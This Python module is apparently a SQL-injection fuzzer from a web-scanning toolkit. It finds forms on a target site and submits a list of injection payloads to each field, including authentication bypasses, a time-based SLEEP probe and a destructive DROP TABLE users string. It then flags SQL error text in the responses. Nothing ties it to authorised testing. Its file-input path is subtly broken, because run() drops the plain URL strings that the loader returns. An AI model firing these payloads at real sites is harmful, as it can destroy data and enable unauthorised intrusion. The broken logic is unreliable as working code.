import csv
import os
import json
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import requests
from urllib.parse import urljoin
import time
import form_analyzer

SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "' AND SLEEP(5)--",
]

def load_urls_from_file(filepath):
    urls = []

    if not os.path.exists(filepath):
        raise FileNotFoundError(f"File not found: {filepath}")

    ext = os.path.splitext(filepath)[-1].lower()

    if ext == ".json":
        with open(filepath, "r") as f:
            data = json.load(f)
            
            # Check if it's a list (form analyzer results format)
            if isinstance(data, list):
                # Extract URLs from form analyzer results
                for item in data:
                    if isinstance(item, dict) and "url" in item:
                        urls.append(item["url"])
            # Check if it's a dict with found_links (other format)
            elif isinstance(data, dict):
                urls = data.get("found_links", [])
                # Also check for other possible URL keys in dict
                if not urls:
                    for key in ("urls", "links", "url_list"):
                        if key in data:
                            urls = data[key] if isinstance(data[key], list) else [data[key]]
                            break

    elif ext == ".csv":
        with open(filepath, "r", newline="") as f:
            reader = csv.DictReader(f)
            for row in reader:
                # First check for form analyzer results format
                if "url" in row and row["url"]:
                    urls.append(row["url"])
                # Then check for other common URL column names
                else:
                    for key in ("link", "found_links", "target_url", "website"):
                        if key in row and row[key]:
                            urls.append(row[key])
                            break

    else:
        raise ValueError("Unsupported file type. Use .json or .csv")

    # Remove duplicates and empty/None values
    urls = [url for url in urls if url and url.strip()]
    return list(set(urls))

def create_session_with_retries(retries, backoff_factor=0.3):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def test_sql_injections(form, base_url, timeout=5, session=None):
    results = []

    action = form.get("action", "")
    method = form.get("method", "get").lower()
    full_url = urljoin(base_url, action)
    inputs = form.get("inputs", [])
    
    for field in inputs:
        if field.get("disabled") or field.get("readonly"):
            continue
        name = field.get("name")
        if not name:
            continue

        for payload in SQL_PAYLOADS:
            form_data = {}

            # Fill in payload for this field, dummy for others
            for input_field in inputs:
                input_name = input_field.get("name")
                if not input_name or input_field.get("disabled") or input_field.get("readonly"):
                    continue
                form_data[input_name] = payload if input_name == name else "test"

            try:
                start = time.time()
                if method == "post":
                    resp = session.post(full_url, data=form_data, timeout=timeout)
                else:
                    resp = session.get(full_url, params=form_data, timeout=timeout)
                end = time.time()

                result = {
                    "target_url": full_url,
                    "field": name,
                    "payload": payload,
                    "status_code": resp.status_code,
                    "response_time": round(end - start, 2),
                    "indicator": "error" if "sql" in resp.text.lower() or "syntax" in resp.text.lower() else "none"
                }
                results.append(result)

            except Exception as e:
                results.append({
                    "target_url": full_url,
                    "field": name,
                    "payload": payload,
                    "error": str(e)
                })

    return results

def run(base_url, file=None, timeout=5, retries=3, user_agent=None):
    all_results = []

    session = create_session_with_retries(retries)
    if user_agent is None:
        user_agent = 'SQLFuzzer/2.0 (Educational purposes)'
    session.headers.update({
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    })

    if file:
        data = load_urls_from_file(file)
        if not data:
            print("[!] No forms found in file.")
            return []

        for form in data:
            if not isinstance(form, dict):
                continue
            url = form.get("url") or base_url
            results = test_sql_injections(form, url, timeout=timeout, session=session)
            all_results.extend(results)

    else:
        print(f"[+] Scanning forms on: {base_url}")
        try:
            forms = form_analyzer.run(base_url, file, timeout, retries, session=session)
            if not forms:
                print("[!] No forms found on target.")
                return []

            for form in forms:
                results = test_sql_injections(form, base_url, timeout=timeout, session=session)
                all_results.extend(results)

        except Exception as e:
            print(f"[!] Error analyzing forms: {e}")
            return []

    return all_results


